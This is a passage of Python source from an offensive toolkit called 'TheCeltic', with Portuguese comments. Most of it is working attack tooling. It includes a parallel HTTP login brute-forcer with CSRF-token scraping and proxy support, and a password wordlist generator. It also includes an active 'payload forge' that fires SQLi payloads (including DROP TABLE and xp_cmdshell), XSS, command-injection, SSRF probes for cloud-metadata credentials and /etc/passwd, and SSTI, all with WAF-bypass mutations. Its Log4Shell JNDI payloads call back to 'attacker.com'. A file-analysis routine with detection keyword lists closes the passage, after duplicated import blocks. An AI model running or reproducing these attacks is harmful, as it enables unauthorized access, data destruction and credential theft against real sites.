            
            use_proxy = input("Usar Proxy? (s/n): ").lower() == 's'
            proxy_url = ""
            if use_proxy:
                print("[INFO] Formato: http://usuario:senha@host:porta")
                print("[INFO] Exemplo: http://user1:pass1@192.168.1.50:8080")
                proxy_url = input("URL do Proxy: ").strip()
                if proxy_url and "://" not in proxy_url:
                    proxy_url = "http://" + proxy_url

            # --- CONFIGURAÇÃO DA SESSÃO ---
            session = requests.Session()
            adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=Retry(total=5, backoff_factor=0.1))
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            if use_proxy and proxy_url:
                session.proxies = {
                    "http": proxy_url,
                    "https": proxy_url
                }
                print(f"[INFO] Proxy configurado: {proxy_url}")

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.0.0 Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest" # Importante para APIs AJAX
            }

            # 1. FINGERPRINTING INICIAL
            print("[INFO] Realizando Fingerprinting inicial...")
            try:
                # GET para pegar cookies/tokens
                initial_response = session.get(target, headers=headers, timeout=10)
                
                # Extrai tokens CSRF se existirem
                hidden_fields = {}
                # Regex para inputs hidden
                input_pattern = re.compile(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', re.IGNORECASE)
                for match in input_pattern.finditer(initial_response.text):
                    name, value = match.groups()
                    hidden_fields[name] = value
                # Também pega inputs normais que pareçam tokens
                input_pattern2 = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', re.IGNORECASE)
                for match in input_pattern2.finditer(initial_response.text):
                    name, value = match.groups()
                    if any(token in name.lower() for token in ['token', 'csrf', 'nonce', 'authenticity', '_token']):
                        hidden_fields[name] = value
                        
                print(f"[INFO] Campos ocultos/Tokens detectados: {list(hidden_fields.keys())}")

                # Envia uma credencial inválida para calibrar
                print("[INFO] Enviando credencial de teste para calibrar assinatura de falha...")
                fingerprint_data = {user_field: "theceltic_fingerprint", pass_field: "theceltic_fingerprint_pass", **hidden_fields}
                fp_response = session.post(target, data=fingerprint_data, headers=headers, timeout=10, allow_redirects=False)
                
                # Gera a assinatura de falha
                failure_signature = {
                    "status": fp_response.status_code,
                    "length": len(fp_response.content),
                    "content_type": fp_response.headers.get('Content-Type', '')
                }
                print(f"[INFO] Assinatura de Falha: Status={failure_signature['status']}, Len={failure_signature['length']}")
                
                # Se o site retornar JSON, tentamos identificar a chave de erro/sucesso
                is_json = 'application/json' in failure_signature['content_type']
                success_keywords = []
                if is_json:
                    try:
                        fp_json = fp_response.json()
                        print(f"[DEBUG] Resposta JSON de falha: {fp_json}")
                        
                    except:
                        pass
                        
            except Exception as e:
                print(f"[ERRO] Falha no Fingerprinting: {e}")
                return

            def test_http(cand):
                try:
                    data = {user_field: cand['user'], pass_field: cand['password'], **hidden_fields}
                    response = session.post(target, data=data, headers=headers, timeout=10, allow_redirects=False)
                    
                    # ESTRATÉGIA 1: Mudança de Status Code
                    if response.status_code != failure_signature["status"]:
                        return cand

                    # ESTRATÉGIA 2: Mudança de Tamanho (HTML/JSON)
                    if abs(len(response.content) - failure_signature["length"]) > 50:
                        return cand

                    # ESTRATÉGIA 3: Análise de Conteúdo (Palavras-chave)
                    if 'application/json' in response.headers.get('Content-Type', ''):
                        try:
                            resp_json = response.json()
                            # Chaves comuns que indicam sucesso em APIs
                            success_indicators = ['token', 'session', 'access_token', 'user_id', 'logged_in', 'success', 'data']
                            for key in success_indicators:
                                if key in resp_json:
                                                                        # Se a chave de sucesso existir, verifica se o valor não é vazio/falso
                                    value = resp_json[key]
                                    if value is not None and value is not False and value != "" and value != []:
                                        # Verificação extra: se for 'success', deve ser True
                                        if key == 'success' and value == True:
                                            return cand
                                        # Se for token/sessão, geralmente é string não vazia
                                        if key in ['token', 'session', 'access_token'] and isinstance(value, str) and len(value) > 5:
                                            return cand
                                        # Se for user_id, geralmente é int ou string numérica
                                        if key == 'user_id' and (isinstance(value, int) or (isinstance(value, str) and value.isdigit())):
                                            return cand
                                        
                            # Verificação de mensagens de erro 
                            error_keywords = ['invalid', 'incorrect', 'failed', 'error', 'wrong', 'denied', 'unauthorized', 'bad credentials']
                            resp_text_lower = str(resp_json).lower()
                            if any(ek in resp_text_lower for ek in error_keywords):
                                return None
                            
                        except Exception:
                            pass

                    # ESTRATÉGIA 4: Verificação de HTML
                    else:
                        #
                        resp_text_lower = response.text.lower()
                        success_html_keywords = ['dashboard', 'welcome', 'logout', 'my account', 'profile', 'settings']
                        if any(shk in resp_text_lower for shk in success_html_keywords):
                            return cand

                    return None
                except requests.exceptions.RequestException as e:
                    # Erro de rede 
                    raise

            run_parallel_attack(candidates, test_http, "HTTP", max_workers=10)

        elif sub_op == 5: # Gerador
            base_users = input("Usuários base (separados por vírgula): ").strip() or "admin,root,user"
            base_passes = input("Palavras base (separadas por vírgula): ").strip() or "password,123,secret"
            suffixes = input("Sufixos (separados por vírgula, ENTER para vazio): ").strip() or "1,123,2023,2024,!"
            
            u_list = [u.strip() for u in base_users.split(',')]
            p_list = [p.strip() for p in base_passes.split(',')]
            s_list = [s.strip() for s in suffixes.split(',')] if suffixes else ['']
            
            print("[INFO] Gerando combinações...")
            wordlist = set()
            for u in u_list:
                for p in p_list:
                    for s in s_list:
                        wordlist.add(f"{u}:{p}{s}")
                        wordlist.add(f"{u}:{u}{s}")
                        wordlist.add(f"{u}:{p.capitalize()}{s}")
            
            output_file = "theceltic_bruteforce_wordlist.txt"
            with open(output_file, 'w') as f:
                f.write("\n".join(sorted(wordlist)))
            print(f"\n[OK] Wordlist gerada em {output_file} com {len(wordlist)} combinações.")

        else:
            print("[!] Opção inválida.")

    except ValueError:
        print("[!] Digite um número válido.")
    except KeyboardInterrupt:
        print("\n\n[!] Operação cancelada pelo usuário.")
        
def payload_forge():
    import requests
    import urllib.parse
    import json
    import time
    import secrets

    print("\n" + "="*50)
    print(" 🧪 THECELTIC PAYLOAD FORGE [FIELD MODE]")
    print("="*50)
    print("""
    [1] SQL Injection (SQLi) - Teste Ativo & Payloads
    [2] Cross-Site Scripting (XSS) - Teste Ativo & Payloads
    [3] Command Injection (OSI) - Teste Ativo & Payloads
    [4] Log4Shell / JNDI - Gerador de Probes
    [5] SSRF / SSTI - Gerador de Probes
    [6] Gerar Wordlist de Mutations (Para ffuf/Burp)
    [0] Voltar ao Menu
    """)
    
    try:
        sub_op = int(input("Escolha o tipo de ataque: "))
        
        if sub_op == 0:
            return

        def save_output(content, filename="theceltic_field_results.txt", header=""):
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# {header}\n# Gerado por TheCeltic Field Mode\n# Data: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                f.write(content)
            print(f"{GREEN}[OK] Resultados salvos em {filename}{RESET}")

        def generate_mutations(base_payload):
            
            mutations = [base_payload]
            
            # 1. URL Encoding
            try:
                mutations.append(urllib.parse.quote(base_payload, safe=''))
            except:
                pass

            # 2. HTML Entities
            try:
                html_mut = base_payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#39;")
                mutations.append(html_mut)
            except:
                pass

            # 3. Whitespace/Comentários (Foco em SQLi)
            mutations.append(base_payload.replace(" ", "+"))
            mutations.append(base_payload.replace(" ", "%20"))
            mutations.append(base_payload.replace(" ", " "))
            mutations.append(base_payload.replace(" ", "/**/"))
            
            # 4. Case Variations (Bypass de filtros case-sensitive)
            mutations.append(base_payload.upper())
            mutations.append(base_payload.lower())
            mutations.append(base_payload.swapcase())
            
            # 5. Nested Braces (Log4Shell specific)
            if "${" in base_payload:
                mutations.append(base_payload.replace("${", "${${"))
                mutations.append(base_payload.replace(":", ":${"))
            
            # 6. Newlines (Command Injection specific)
            if ";" in base_payload or "|" in base_payload:
                mutations.append(base_payload.replace(" ", "\n"))
                mutations.append(base_payload.replace(" ", "\r\n"))
                mutations.append(base_payload.replace(" ", "%0A"))
                mutations.append(base_payload.replace(" ", "%0D%0A"))
                mutations.append(base_payload.replace(" ", "\\n"))

            # Remove duplicados mantendo a ordem
            seen = set()
            unique_mutations = []
            for m in mutations:
                if m not in seen:
                    seen.add(m)
                    unique_mutations.append(m)
            return unique_mutations

        def active_test(url, method="GET", payload_field=None, payloads=None, success_indicators=None, error_indicators=None):
            """
            Executa um teste ativo injetando payloads e analisando a resposta.
            """
            headers = {
                "User-Agent": "TheCelticField/1.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5"
            }
            
            results = []
            print(f"\n{YELLOW}[TESTE ATIVO]{RESET} Iniciando varredura em: {url}")
            print(f"Payloads para testar: {len(payloads)}")
            
            for payload in payloads:
                try:
                    # Injeção Dinâmica
                    if payload_field:
                        if method == "GET":
                            params = {payload_field: payload}
                            response = requests.get(url, params=params, headers=headers, timeout=10, verify=False)
                        elif method == "POST":
                            data = {payload_field: payload}
                            response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
                    else:
                        # Se não houver campo, assume que a URL tem o placeholder {{payload}}
                        if "{{payload}}" in url:
                            # Encode o payload para a URL
                            encoded_payload = urllib.parse.quote(payload, safe='')
                            final_url = url.replace("{{payload}}", encoded_payload)
                            response = requests.get(final_url, headers=headers, timeout=10, verify=False)
                        else:
                            # Fallback: tenta adicionar como query param genérico
                            params = {"payload": payload}
                            response = requests.get(url, params=params, headers=headers, timeout=10, verify=False)
                    
                    # Análise de Resposta
                    status = response.status_code
                    content = response.text[:5000] # Limita análise aos primeiros 5KB
                    content_lower = content.lower()
                    
                    is_success = False
                    is_error = False
                    reason = ""
                    
                    # 1. Verificação de Erros do Banco/Sistema
                    if error_indicators:
                        for indicator in error_indicators:
                            if indicator.lower() in content_lower:
                                is_error = True
                                reason = f"Indicador de erro encontrado: {indicator}"
                                break
                    
                    # 2. Verificação de Sucesso
                    if success_indicators:
                        for indicator in success_indicators:
                            if indicator.lower() in content_lower:
                                is_success = True
                                reason = f"Indicador de sucesso encontrado: {indicator}"
                                break
                    
                    # 3. Verificação de Reflexão (XSS)
                    
                    if not is_success and not is_error:
                        if payload in content or urllib.parse.quote(payload, safe='') in content:
                            is_success = True
                            reason = "Payload refletido na resposta (Possível XSS/Reflexão)"

                    results.append({
                        "payload": payload,
                        "status": status,
                        "result": "SUCCESS" if is_success else ("ERROR" if is_error else "NEUTRAL"),
                        "reason": reason
                    })
                    
                    if is_success:
                        print(f"{GREEN}[HIT]{RESET} Payload: {payload[:50]}... | Status: {status} | {reason}")
                    elif is_error:
                        print(f"{YELLOW}[ERR]{RESET} Payload: {payload[:50]}... | Status: {status} | {reason}")
                    else:
                        print(f"{RESET}[---] Payload: {payload[:50]}... | Status: {status}")

                except requests.exceptions.RequestException as e:
                    print(f"{RED}[FAIL]{RESET} Erro de rede: {e}")

            return results

        # --- LÓGICA POR TIPO DE ATAQUE ---

        if sub_op == 1: # SQLi
            print("\n[1] SQLi Field Mode")
            url = input("URL Base (ex: http://lab.com/search.php?q=): ").strip()
            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
            field = input("Nome do campo para injeção (ex: q) [ENTER para usar {{payload}}]: ").strip()
            
            if not field:
                if "{{payload}}" not in url:
                    url = url + "?{{payload}}"
                field = None
            
            print("\n[2] Tipo de SQLi:")
            print("1. In-Line (União/1=1)")
            print("2. Error-Based (Extrair Erro)")
            print("3. Time-Based (Blind)")
            print("4. Stacked (Múltiplos comandos)")
            sqli_type = int(input("Escolha (1-4): "))

            error_indicators = ["sql syntax", "mysql_fetch", "pg_query", "ora-", "unclosed quotation mark", "syntax error", "valid mysql result"]
            success_indicators = ["admin", "root", "true", "1"] # Genérico, ajuste conforme necessário

            if sqli_type == 1:
                base_payloads = [
                    "1' OR 1=1-- ",
                    "1' OR '1'='1",
                    "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- ",
                    "1' AND 1=1-- ",
                    "1' AND 1=2-- "
                ]
            elif sqli_type == 2:
                base_payloads = [
                    "' AND extractvalue(1,concat(0x7e,(SELECT database())))-- ",
                    "' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)),1)-- ",
                    "1' AND 1/0-- "
                ]
            elif sqli_type == 3:
                base_payloads = [
                    "1' AND SLEEP(5)-- ",
                    "1' AND BENCHMARK(5000000,SHA1('TEST'))-- ",
                    "1' AND pg_sleep(5)-- "
                ]
            else: # Stacked
                base_payloads = [
                    "1'; DROP TABLE users-- ",
                    "1'; SELECT * FROM sys.tables-- ",
                    "1'; EXEC xp_cmdshell 'whoami'-- "
                ]
            
            print("Gerando mutações para bypass de WAF...")
            final_payloads = []
            for bp in base_payloads:
                final_payloads.extend(generate_mutations(bp))
            
            # Remove duplicados
            final_payloads = list(set(final_payloads))
            
            save_choice = input("Deseja salvar a lista de payloads em TXT antes de testar? (s/n): ").lower() == 's'
            if save_choice:
                with open("theceltic_sqli_mutations.txt", 'w') as f:
                    f.write("\n".join(final_payloads))
                print(f"{GREEN}[OK] Mutations salvas em theceltic_sqli_mutations.txt{RESET}")

            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
            if test_choice:
                results = active_test(
                    url=url,
                    method=method,
                    payload_field=field,
                    payloads=final_payloads,
                    success_indicators=success_indicators,
                    error_indicators=error_indicators
                )
                # Salva resultados detalhados
                if any(r["result"] == "SUCCESS" for r in results):
                    save_output(json.dumps(results, indent=2, ensure_ascii=False), "theceltic_sqli_hits.json", "SQLi Active Test Results")

        elif sub_op == 2: # XSS
            print("\n[2] XSS Field Mode")
            url = input("URL Base (ex: http://lab.com/search.php?q=): ").strip()
            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
            field = input("Nome do campo para injeção (ex: q) [ENTER para usar {{payload}}]: ").strip()
            
            if not field:
                if "{{payload}}" not in url:
                    url = url + "?{{payload}}"
                field = None

            print("\n[2] Contexto XSS:")
            print("1. HTML (Texto puro)")
            print("2. Attribute (Dentro de atributo)")
            print("3. JavaScript (Dentro de JS)")
            print("4. Universal (Polyglot)")
            xss_type = int(input("Escolha (1-4): "))

            # Indicadores de Sucesso para XSS: O payload deve aparecer na resposta
            success_indicators = ["theceltic_xss_marker"] 
            error_indicators = []

            if xss_type == 1:
                payloads = [
                    "<script>alert('TheCeltic_XSS_Marker')</script>",
                    "<img src=x onerror=alert('TheCeltic_XSS_Marker')>",
                    "<svg onload=alert('TheCeltic_XSS_Marker')>"
                ]
            elif xss_type == 2:
                payloads = [
                    "\" onmouseover=alert('TheCeltic_XSS_Marker')",
                    "' onmouseover=alert('TheCeltic_XSS_Marker')",
                    "` onmouseover=alert('TheCeltic_XSS_Marker')"
                ]
            elif xss_type == 3:
                payloads = [
                    "'; alert('TheCeltic_XSS_Marker'); //",
                    "\"; alert('TheCeltic_XSS_Marker'); //",
                    "`; alert('TheCeltic_XSS_Marker'); //"
                ]
            else:
                payloads = [
                    "\"'><img src=x onerror=alert('TheCeltic_XSS_Marker')>",
                    "';\"><script>alert('TheCeltic_XSS_Marker')</script>",
                    "`'><svg/onload=alert('TheCeltic_XSS_Marker')>"
                ]

            # Gera mutações básicas
            final_payloads = []
            for p in payloads:
                final_payloads.extend(generate_mutations(p))
            final_payloads = list(set(final_payloads))

            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
            if test_choice:
                # Para XSS, o "sucesso" é a reflexão do payload
                results = active_test(
                    url=url,
                    method=method,
                    payload_field=field,
                    payloads=final_payloads,
                    success_indicators=success_indicators,
                    error_indicators=error_indicators
                )
                if any(r["result"] == "SUCCESS" for r in results):
                    save_output(json.dumps(results, indent=2, ensure_ascii=False), "theceltic_xss_hits.json", "XSS Active Test Results")

        elif sub_op == 3: # Command Injection
            print("\n[3] Command Injection Field Mode")
            url = input("URL Base (ex: http://lab.com/ping.php?ip=): ").strip()
            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
            field = input("Nome do campo para injeção (ex: ip) [ENTER para usar {{payload}}]: ").strip()
            
            if not field:
                if "{{payload}}" not in url:
                    url = url + "?{{payload}}"
                field = None

            payloads = [
                "127.0.0.1; whoami",
                "127.0.0.1 | whoami",
                "127.0.0.1 `whoami`",
                "127.0.0.1 $(whoami)",
                "127.0.0.1 && whoami"
            ]
            
            # Adiciona mutações
            final_payloads = []
            for p in payloads:
                final_payloads.extend(generate_mutations(p))
            final_payloads = list(set(final_payloads))

            # Indicadores: Output de comando (root, www-data, etc)
            success_indicators = ["root", "www-data", "apache", "nobody", "uid=", "gid="]
            error_indicators = []

            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
            if test_choice:
                results = active_test(
                    url=url,
                    method=method,
                    payload_field=field,
                    payloads=final_payloads,
                    success_indicators=success_indicators,
                    error_indicators=error_indicators
                )

        elif sub_op == 4: # Log4Shell
            print("\n[4] Log4Shell / JNDI Probes")
            
            unique_id = secrets.token_hex(8)
            base_url = input("Seu domínio/IP para o callback (ex: 192.168.1.10): ").strip() or "attacker.com"
            payload = "${" + "${lower:j}ndi:ldap://" + base_url + "/theceltic_" + unique_id + "}}"
            
            print(f"\n{GREEN}PAYLOAD GERAL:{RESET}\n{payload}")
            print(f"\n{YELLOW}COMO TESTAR:{RESET}")
            print(f"1. Inicie um listener LDAP: ldapsearch -x -H ldap://{base_url} -b '' -s base -LLL")
            print(f"   Ou use: java -cp . LdapServer")
            print(f"2. Insira este payload em headers (User-Agent, X-Forwarded-For) ou parâmetros.")
            print(f"3. Monitore o callback para a string: theceltic_{unique_id}")
            
            save_choice = input("Salvar payload em TXT? (s/n): ").lower() == 's'
            if save_choice:
                save_output(payload, "theceltic_log4shell_payload.txt", "Log4Shell Probe")

        elif sub_op == 5: # SSRF / SSTI
            print("\n[5] SSRF / SSTI Field Mode")
            print("1. SSRF (Cloud Metadata & Internal Services)")
            print("2. SSTI (Server-Side Template Injection)")
            sub_5 = int(input("Escolha (1-2): "))
            
            url = input("URL Base (ex: http://lab.com/fetch?url=): ").strip()
            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
            field = input("Nome do campo para injeção (ex: url) [ENTER para usar {{payload}}]: ").strip()
            
            if not field:
                if "{{payload}}" not in url:
                    url = url + "?{{payload}}"
                field = None

            if sub_5 == 1: # SSRF
                payloads = [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://127.0.0.1:8080/admin",
                    "http://localhost:5984/_all_dbs",
                    "gopher://localhost:6379/_INFO",
                    "dict://localhost:6379/info",
                    "file:///etc/passwd"
                ]
                # Indicadores de Sucesso: Metadados da nuvem ou conteúdo de arquivo local
                success_indicators = ["ami-id", "instance-id", "accesskey", "root:", "etc/passwd", "admin", "dashboard"]
                error_indicators = ["connection refused", "timeout", "404 not found"]
                
            else: # SSTI
                payloads = [
                    "{{7*7}}",
                    "${7*7}",
                    "<%= 7*7 %>",
                    "#{7*7}",
                    "{{self.__class__.__mro__}}",
                    "{{config.items()}}",
                    "{{7*'A'}}"
                ]
                
                success_indicators = ["49", "AAA", "mro", "config", "jinja2", "mako", "django", "tornado"]
                error_indicators = ["syntaxerror", "invalidsyntax", "templateerror"]

            final_payloads = list(set(payloads))
            
            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
            if test_choice:
                results = active_test(
                    url=url,
                    method=method,
                    payload_field=field,
                    payloads=final_payloads,
                    success_indicators=success_indicators,
                    error_indicators=error_indicators
                )
                if any(r["result"] == "SUCCESS" for r in results):
                    save_output(json.dumps(results, indent=2, ensure_ascii=False), "theceltic_ssrf_ssti_hits.json", "SSRF/SSTI Active Test Results")

        elif sub_op == 6: # Gerar Wordlist de Mutations
            print("\n[6] Gerador de Wordlist de Mutations (Para ffuf/Burp)")
            print("1. SQLi (Comentários, Whitespace, Case)")
            print("2. XSS (HTML Entities, URL Encoding)")
            print("3. Command Injection (Newlines, Whitespace)")
            print("4. Log4Shell (Nested Braces)")
            print("5. Custom (Digite o payload base)")
            
            mut_type = int(input("Escolha (1-5): "))
            output_file = input("Nome do arquivo de saída (padrão: theceltic_mutations.txt): ").strip() or "theceltic_mutations.txt"
            
            base_payload = ""
            if mut_type == 5:
                base_payload = input("Digite o payload base: ").strip()
            else:
                # Payloads base específicos para mutação
                if mut_type == 1:
                    base_payload = "1' OR 1=1-- "
                elif mut_type == 2:
                    base_payload = "<script>alert(1)</script>"
                elif mut_type == 3:
                    base_payload = "; whoami"
                elif mut_type == 4:
                    base_payload = "${jndi:ldap://attacker.com/a}"

            print(f"Gerando mutações baseadas em: {base_payload}")
            
            # Gera as mutações usando a função existente
            final_mutations = generate_mutations(base_payload)
            
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(final_mutations))
            
            print(f"{GREEN}[OK] {len(final_mutations)} mutações salvas em {output_file}{RESET}")
            print(f"Dica: Use 'ffuf -w {output_file} -X GET -H 'User-Agent: TheCeltic' -- {url}'")

        else:
            print("[!] Opção inválida.")

    except ValueError:
        print("[!] Digite um número válido.")
    except KeyboardInterrupt:
        print("\n\n[!] Operação cancelada pelo usuário.")

import os
import hashlib
import re
import math
import struct
import json
import platform
import datetime
import html
import zipfile
from collections import Counter

# Definição de cores ANSI
class C:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'

# Usando alias para facilitar a leitura no código abaixo
RED = C.RED
GREEN = C.GREEN
YELLOW = C.YELLOW
BLUE = C.BLUE
RESET = C.RESET

import os
import sys
import re
import math
import struct
import hashlib
import platform
import zipfile
import datetime
from collections import Counter

# ANSI Colors
RESET = '\033[0m'
BLUE = '\033[94m'
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'

def reverse_engineer():
    print("\n" + "="*50)
    print(f"{BLUE} 🔬 THECELTIC REVERSE ENGINEER [FIELD MODE]{RESET}")
    print("="*50)
    print(f"{BLUE}Análise estática de binários, scripts e arquivos de dados.")
    print(f"{BLUE}Recursos: Entropia, Strings, Packer Detection, PE/ELF Headers.")
    print("")
    
    # Detecta o SO
    current_os = platform.system()
    print(f"[INFO] Ambiente: {current_os}")
    print("")
    
    file_path = input("Caminho do arquivo (ex: ./beacon.exe ou ./script.py): ").strip()
    
    if not os.path.exists(file_path):
        print(f"{RED}[ERRO]{RESET} Arquivo não encontrado: {file_path}")
        return

    file_size = os.path.getsize(file_path)
    if file_size == 0:
        print(f"{RED}[ERRO]{RESET} O arquivo está vazio.")
        return

    print(f"\n[INFO] Analisando: {os.path.basename(file_path)}")
    print(f"[INFO] Tamanho: {file_size} bytes ({file_size/1024:.2f} KB)")

    # 1. HASHING
    print("\n" + "-"*20)
    print(" [1] HASHING (Integridade)")
    print("-"*20)
    hashes = {}
    for algo in ['md5', 'sha1', 'sha256']:
        h = hashlib.new(algo)
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(4096), b''):
                h.update(block)
        hashes[algo] = h.hexdigest()
        print(f"{algo.upper()}: {hashes[algo]}")
    
    # 2. ENTROPIA
    print("\n" + "-"*20)
    print(" [2] ANÁLISE DE ENTROPIA")
    print("-"*20)
    with open(file_path, 'rb') as f:
        data = f.read()
    
    if not data:
        print("Arquivo vazio.")
        return

    # Usando Counter é mais eficiente que loop manual
    byte_counts = Counter(data)
    total_bytes = len(data)
    
    entropy = 0.0
    for count in byte_counts.values():
        p_x = count / total_bytes
        if p_x > 0:
            entropy -= p_x * math.log2(p_x)
            
    print(f"Entropia: {entropy:.4f} bits/byte")
    if entropy > 7.5:
        print(f"{RED}[ALERTA]{RESET} Alta entropia. Possível ofuscamento, criptografia ou Packer.")
    elif entropy > 6.0:
        print(f"{YELLOW}[INFO]{RESET} Entropia média. Binário provavelmente não empacotado.")
    else:
        print(f"{GREEN}[INFO]{RESET} Entropia baixa. Arquivo pode ser texto, script ou binário simples.")

    # 3. STRINGS
    print("\n" + "-"*20)
    print(" [3] EXTRAÇÃO DE STRINGS CRÍTICAS")
    print("-"*20)
    pattern = re.compile(b'[\x20-\x7E]{6,}')
    strings_found = set(m.group(0).decode('utf-8', errors='ignore') for m in pattern.finditer(data))
    
    security_keywords = [
        r'http://', r'https://', r'ldap://', r'amqp://', r'mqtt://',
        r'password', r'passwd', r'secret', r'api_key', r'token', r'credential',
        r'admin', r'root', r'system32', r'registry', r'winreg', r'hkcu', r'hklm',
        r'powershell', r'cmd.exe', r'bash', r'sh -c', r'exec', r'system',
        r'theceltic', r'beacon', r'c2', r'callback', r'jndi', r'log4shell',
        r'sleep', r'benchmark', r'pg_sleep', r'extractvalue', r'updatexml',
        r'union', r'select', r'insert', r'update', r'delete', r'drop',
        r'onerror', r'onload', r'onclick', r'javascript:', r'vbscript:',
        r'whoami', r'id', r'uname', r'ifconfig', r'ipconfig', r'netstat',
        r'169.254.169.254', r'metadata', r'iam', r'security-credentials'
    ]
    
    interesting_strings = []
    for s in strings_found:
        for kw in security_keywords:
            if re.search(kw, s, re.IGNORECASE):
                interesting_strings.append(s)
                break

    if interesting_strings:
        print(f"Encontradas {len(interesting_strings)} strings de interesse:")
        for s in interesting_strings[:30]:
            display_s = s[:120] + ("..." if len(s) > 120 else "")
            print(f"  - {display_s}")
        
        save_choice = input("Deseja salvar TODAS as strings em um arquivo .txt? (s/n): ").lower() == 's'
        if save_choice:
            out_file = os.path.basename(file_path) + "_strings.txt"
            with open(out_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(sorted(interesting_strings)))
            print(f"{GREEN}[OK]{RESET} Strings salvas em {out_file}")
    else:
        print(f"{YELLOW}[INFO]{RESET} Nenhuma string crítica encontrada.")

    # 4. DETECTOR DE PACKER
    print("\n" + "-"*20)
    print(" [4] DETECTOR DE PACKER (Assinaturas)")
    print("-"*20)
    packers = {
        b'UPX!': "UPX",
        b'UPX0': "UPX (Zeroed)",
        b'Themida': "Themida",
        b'VMProtect': "VMProtect",
        b'ASPack': "ASPack",
        b'FSG': "FSG (FSGuard)",
        b'PEtite': "PEtite",
        b'MPRESS': "MPRESS",
        b'Nspack': "NSPack",
        b'PECompact': "PECompact",
        b"Yoda's Cryptic": "Yoda's Cryptic",
        b'Armadillo': "Armadillo",
        b'Enigma': "Enigma Protector",
        b'ASProtect': "ASProtect",
        b'ExeCryptor': "ExeCryptor",
        b'PEbundle': "PEbundle"
    }
    found_packer = None
    for sig, name in packers.items():
        if sig in data:
            found_packer = name
            break
            
    if found_packer:
        print(f"{RED}[ALERTA]{RESET} Packer detectado: {found_packer}")
        print("Recomendação: Descompacte (unpack) antes de análise estática profunda.")
    else:
        print(f"{GREEN}[OK]{RESET} Nenhum packer comum detectado.")

    # 5. ANÁLISE ESPECÍFICA POR TIPO
    print("\n" + "-"*20)
    print(" [5] ANÁLISE ESPECÍFICA POR TIPO")
    print("-"*20)
    
    file_type = "Desconhecido"
    
    # --- PE (Windows Executável) ---
    if data[:2] == b'MZ':
        file_type = "Executável Windows (PE)"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Executável Windows (PE).")
        try:
            # Offset do header PE 
            pe_offset = struct.unpack('<I', data[0x3C:0x40])[0]
            
            # Verificação de segurança
            if pe_offset + 24 > len(data):
                raise ValueError("Arquivo truncado ou offset inválido")

            if data[pe_offset:pe_offset+4] == b'PE\0\0':
                
                # Machine Type
                machine = struct.unpack('<H', data[pe_offset+4:pe_offset+6])[0]
                # TimeDateStamp
                timestamp_raw = struct.unpack('<I', data[pe_offset+8:pe_offset+12])[0]
                try:
                    timestamp = datetime.datetime.utcfromtimestamp(timestamp_raw).isoformat()
                except:
                    timestamp = "N/A"
                
                opt_header_size = struct.unpack('<H', data[pe_offset+20:pe_offset+22])[0]
                
                opt_start = pe_offset + 24
                
                # Verifica se o arquivo é grande o suficiente
                if opt_start + 0x42 <= len(data):
                    subsystem = struct.unpack('<H', data[opt_start + 0x40:opt_start + 0x42])[0]
                    sub_name = {2: "GUI", 3: "CUI", 1: "Native", 7: "POSIX"}.get(subsystem, f"Unknown ({subsystem})")
                else:
                    sub_name = "N/A (Truncado)"

                print(f"[INFO] PE Header válido no offset: {hex(pe_offset)}")
                print(f"[INFO] Machine: {hex(machine)}")
                print(f"[INFO] Timestamp: {timestamp}")
                print(f"[INFO] Subsystem: {sub_name}")
                
            else:
                print(f"{YELLOW}[WARN]{RESET} MZ header presente, mas PE header não encontrado no offset esperado.")
        except (struct.error, IndexError, ValueError) as e:
            print(f"{YELLOW}[WARN]{RESET} Erro ao analisar estrutura PE: {e}")
    
    # --- ELF (Linux Executável) ---
    elif data[:4] == b'\x7fELF':
        file_type = "Executável Linux (ELF)"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Executável Linux (ELF).")
        try:
            # ELF Header básico
            e_ident_class = data[4] # 1: 32-bit, 2: 64-bit
            e_machine = struct.unpack('<H', data[18:20])[0]
            print(f"[INFO] Classe: {'32-bit' if e_ident_class == 1 else '64-bit' if e_ident_class == 2 else 'Unknown'}")
            
            # Strings de caminho
            path_strings = re.findall(b'[/\\][\w\-\.]+[/\\][\w\-\.]+', data)
            if path_strings:
                unique_paths = list(set(path_strings))[:10]
                print(f"[INFO] Strings de caminho detectadas ({len(unique_paths)}):")
                for ps in unique_paths:
                    print(f"  - {ps.decode('utf-8', errors='ignore')}")
        except Exception as e:
